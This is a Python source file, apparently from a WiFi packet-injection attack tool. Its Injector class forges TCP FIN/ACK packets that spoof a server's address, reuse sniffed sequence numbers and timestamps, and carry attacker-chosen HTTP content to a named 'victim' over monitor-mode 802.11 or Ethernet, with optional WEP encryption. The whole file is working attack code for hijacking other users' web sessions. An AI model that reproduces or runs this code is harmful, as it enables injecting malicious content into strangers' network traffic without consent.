from lib.headers import Headers
from lib.visuals import Bcolors
from pyDot11 import *
#from scapy.all import *
import fcntl, socket, struct, sys, time

global npackets
npackets = 0

### Verify these can be removed
#global BLOCK_HOSTS
#BLOCK_HOSTS = set()


class Injector(object):
    """Uses scapy to inject packets on the networks"""
    
    def __init__(self, interface):
        self.interface = interface


    def getHwAddr(self, ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
        mac=':'.join(['%02x' % ord(char) for char in info[18:24]])
        return mac


    def float_to_hex(self,f):
        return hex(struct.unpack('<I', struct.pack('<f', f))[0])


    def inject(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args, procTimerStart, procTimerEnd):
        """Send the injection using Scapy"""
        injectTimerStart = time.time()
        global npackets
        npackets += 1
        sys.stdout.write(Bcolors.OKBLUE + "[*] Injecting Packet to victim " + Bcolors.WARNING + vicmac + Bcolors.OKBLUE + " (TOTAL: " + str(npackets) + " injected packets)\r" + Bcolors.ENDC)
        sys.stdout.flush()
        if ("mon" in self.interface):
            hdr = Headers()
            headers = hdr.default(injection)

            ### Nasty quick&dirty PoC for pyDot11
            ### This if should be verified against open, and then combined when ==
            if args.p:
                packet = RadioTap()\
                        /Dot11(
                              FCfield = 'from-DS',
                              addr1 = vicmac,
                              addr2 = rtrmac,
                              addr3 = rtrmac,
                              subtype = 8L,
                              type = 2
                              )\
                        /Dot11QoS()\
                        /LLC()\
                        /SNAP()\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = 'FA',
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )\

            else:
                packet = RadioTap()\
                        /Dot11(
                              FCfield = 'from-DS',
                              addr1 = vicmac,
                              addr2 = rtrmac,
                              addr3 = rtrmac
                              )\
                        /LLC()\
                        /SNAP()\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = 'FA',
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )\
                    
            if TSVal is not None and TSecr is not None:
                packet[TCP].options = [
                                      ('NOP', None),
                                      ('NOP', None),
                                      ('Timestamp',
                                      ((round(time.time()), TSVal)))
                                      ]
            else:
                packet[TCP].options = [
                                      ('NOP', None),
                                      ('NOP', None),
                                      ('Timestamp',
                                      ((round(time.time()), 0)))
                                      ]

            if args.p:
                packet = wepEncrypt(packet, args.w)

            try:
                sendp(packet, iface = self.interface, verbose = 0)
                injectTimerEnd = time.time()
                if args.d:
                    print '\nProcess Began: %f' % procTimerStart
                    print 'Process Ended:   %f' % procTimerEnd
                    print 'Process Delta:   %f' % (procTimerEnd - procTimerStart)
                    print 'Injection Began: %f' % injectTimerStart
                    print 'Injection Ended: %f' % injectTimerEnd
                    print 'Injection Delta: %f' % (injectTimerEnd - injectTimerStart)
            except:
                pass

            ### Single packet exit point
            ### Have to work on how to exit cleanly, instantiation is preventing?...
            if args.single:
                sys.stdout.write(Bcolors.OKBLUE + "[*] Injecting Packet to victim " + Bcolors.WARNING + vicmac + Bcolors.OKBLUE + " (TOTAL: " + str(npackets) + " injected packets)\r" + Bcolors.ENDC)
                sys.exit(0)
        else:
            hdr = Headers()
            headers = hdr.default(injection)
            
            ### Nasty quick&dirty PoC for pyDot11
            if args.p:
                packet = RadioTap()\
                        /Dot11(
                              FCfield = 'from-DS',
                              addr1 = vicmac,
                              addr2 = rtrmac,
                              addr3 = rtrmac
                              )\
                        /LLC()\
                        /SNAP()\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = "FA",
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )\
                        
                if TSVal is not None:
                    packet[TCP].options = [
                                          ('NOP', None),
                                          ('NOP', None),
                                          ('Timestamp',
                                          ((round(time.time()), TSVal)))
                                          ]
                else:
                    packet[TCP].options = [
                                          ('NOP', None),
                                          ('NOP', None),
                                          ('Timestamp',
                                          ((round(time.time()), 0)))
                                          ]

                packet = wepEncrypt(packet, args.w)
                        
                
            else:
                packet = Ether(
                              src = self.getHwAddr(self.interface),
                              dst = vicmac
                              )\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = 'FA',
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )\

                if TSVal is not None:
                    packet[TCP].options = [
                                          ('NOP', None),
                                          ('NOP', None),
                                          ('Timestamp',
                                          ((round(time.time()), TSVal)))
                                          ]
                else:
                    packet[TCP].options = [
                                          ('NOP', None),
                                          ('NOP', None),
                                          ('Timestamp',
                                          ((round(time.time()), 0)))
                                          ]

            try:
                ### pyDot11 hack
                if args.p:
                    sendp(packet, iface = args.i, verbose = 0)
                else:
                    sendp(packet, iface = self.interface, verbose = 0)

                injectTimerEnd = time.time()
                if args.d:
                    print '\nProcess Began: %f' % procTimerStart
                    print 'Process Ended:   %f' % procTimerEnd
                    print 'Process Delta:   %f' % (procTimerEnd - procTimerStart)
                    print 'Injection Began: %f' % injectTimerStart
                    print 'Injection Ended: %f' % injectTimerEnd
                    print 'Injection Delta: %f' % (injectTimerEnd - injectTimerStart)
                
            except:
                pass

            return
